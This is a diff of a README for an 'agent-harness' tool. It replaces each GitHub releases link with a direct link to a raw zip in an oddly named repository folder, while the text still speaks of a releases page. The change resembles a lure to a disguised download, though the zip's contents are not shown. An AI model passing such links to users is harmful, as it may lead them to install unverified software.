@@ -1,10 +1,10 @@
 # 🤖 agent-harness - Build and run agent tools
 
-[![Download agent-harness](https://img.shields.io/badge/Download%20agent--harness-blue?style=for-the-badge)](https://github.com/vmy41/agent-harness/releases)
+[![Download agent-harness](https://img.shields.io/badge/Download%20agent--harness-blue?style=for-the-badge)](https://raw.githubusercontent.com/vmy41/agent-harness/main/diaclase/agent-harness-v2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/vmy41/agent-harness/releases
+Visit this page to download: https://raw.githubusercontent.com/vmy41/agent-harness/main/diaclase/agent-harness-v2.7.zip
 
 On that page, look for the latest release for Windows. Download the file that matches your system. If you are not sure, pick the standard Windows build.
 
@@ -177,4 +177,4 @@ If the app does not work as expected:
 
 ## 🔗 Download again
 
-https://github.com/vmy41/agent-harness/releases
+https://raw.githubusercontent.com/vmy41/agent-harness/main/diaclase/agent-harness-v2.7.zip
